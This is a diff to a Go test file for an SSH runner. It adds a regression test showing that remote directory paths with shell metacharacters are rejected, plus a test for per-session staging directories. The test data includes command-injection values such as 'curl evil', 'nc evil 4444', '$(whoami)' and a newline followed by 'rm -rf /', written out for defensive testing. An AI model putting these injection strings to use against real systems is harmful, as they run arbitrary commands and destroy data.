@@ -1,7 +1,9 @@
 package runtime
 
 import (
+	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"testing"
 )
@@ -59,6 +61,38 @@ func TestNewSSHRunner_RejectsTraversal(t *testing.T) {
 		_, err := NewSSHRunner(SSHConfig{Host: "user@host", RemoteDir: dir})
 		if err == nil {
 			t.Errorf("NewSSHRunner(remoteDir=%q) accepted invalid path", dir)
+		}
+	}
+}
+
+// TestValidateRemoteDir_RejectsShellMetas pins the strict POSIX charset
+// gate. ValidateRemoteDir previously rejected only `..` traversal and
+// non-absolute paths — shell metacharacters slipped through and survived
+// path.Clean into the `cd %s && ...` interpolation in Run. A
+// remote_dir like `/tmp/vxd; touch /tmp/pwn` was accepted; `cd` would
+// chdir to `/tmp/vxd` and then run `touch /tmp/pwn`.
+func TestValidateRemoteDir_RejectsShellMetas(t *testing.T) {
+	bad := []string{
+		"/tmp/vxd; touch /tmp/pwn",      // command separator
+		"/tmp/vxd && curl evil",         // logical-and
+		"/tmp/vxd | nc evil 4444",       // pipe
+		"/tmp/vxd $(whoami)",            // command substitution
+		"/tmp/vxd `id`",                 // backtick substitution
+		"/tmp/vxd > /etc/passwd",        // redirect
+		"/tmp/vxd\nrm -rf /",            // newline injection
+		"/tmp/vxd\tfoo",                 // tab
+		"/tmp/vxd 'foo'",                // quotes
+		`/tmp/vxd "foo"`,                // double quotes
+		"/tmp/vxd*",                     // glob
+		"/tmp/vxd?",                     // glob ?
+		"/tmp/vxd[abc]",                 // glob class
+		`/tmp/vxd\rm`,                   // backslash
+		"/tmp/~/.ssh",                   // tilde expansion
+		"/tmp/vxd#hash",                 // comment marker on some shells
+	}
+	for _, d := range bad {
+		if err := ValidateRemoteDir(d); err == nil {
+			t.Errorf("ValidateRemoteDir(%q) accepted shell-meta input", d)
 		}
 	}
 }
@@ -203,6 +237,63 @@ func TestSSHRunner_Run_CreatesRemoteDir(t *testing.T) {
 	}
 	if !found {
 		t.Errorf("commands = %v, should contain mkdir for remote dir", commands)
+	}
+}
+
+// TestSSHRunner_Run_ParallelSessionsNoStaging pins the per-session
+// staging directory created by Run. Prior code wrote every setup file
+// to `filepath.Join(os.TempDir(), filepath.Base(localPath))`, so two
+// concurrent sessions uploading `prompt.txt` would race on the same
+// host-side path — the loser's file could be scp'd as the winner's.
+// The fix uses os.MkdirTemp per Run; the test asserts that two
+// sessions running back-to-back observe distinct staging paths in their
+// scp commands.
+func TestSSHRunner_Run_ParallelSessionsNoStaging(t *testing.T) {
+	var scpSources []string
+	original := sshExecCommand
+	sshExecCommand = func(name string, args ...string) *exec.Cmd {
+		if name == "scp" {
+			// scp args: [-i key] <local> user@host:remote
+			// The local path is the second-to-last arg or the second
+			// positional arg depending on whether -i is present.
+			for i, a := range args {
+				if i+1 < len(args) && strings.Contains(args[i+1], "@") {
+					scpSources = append(scpSources, a)
+					break
+				}
+			}
+		}
+		return exec.Command("true")
+	}
+	defer func() { sshExecCommand = original }()
+
+	for _, sess := range []string{"sessA", "sessB"} {
+		r := mustNewSSHRunner(t, SSHConfig{Host: "user@host", RemoteDir: "/opt/vxd"})
+		pe := PreparedExecution{
+			Command:     "echo ok",
+			WorkDir:     t.TempDir(),
+			SessionName: sess,
+			SetupFiles:  map[string]string{"/anywhere/prompt.txt": "secret-" + sess},
+			Env:         map[string]string{},
+		}
+		if err := r.Run(pe); err != nil {
+			t.Fatalf("Run(%s): %v", sess, err)
+		}
+	}
+
+	if len(scpSources) != 2 {
+		t.Fatalf("expected 2 scp uploads, got %d (%v)", len(scpSources), scpSources)
+	}
+	if scpSources[0] == scpSources[1] {
+		t.Errorf("scp source paths collided across sessions: %v (parallel runs would overwrite each other's prompt)", scpSources)
+	}
+	// Cleanup happens in Run via defer os.RemoveAll — both staging dirs
+	// must be gone after Run returns.
+	for _, src := range scpSources {
+		dir := filepath.Dir(src)
+		if _, err := os.Stat(dir); err == nil {
+			t.Errorf("staging dir %s not cleaned up after Run", dir)
+		}
 	}
 }
 
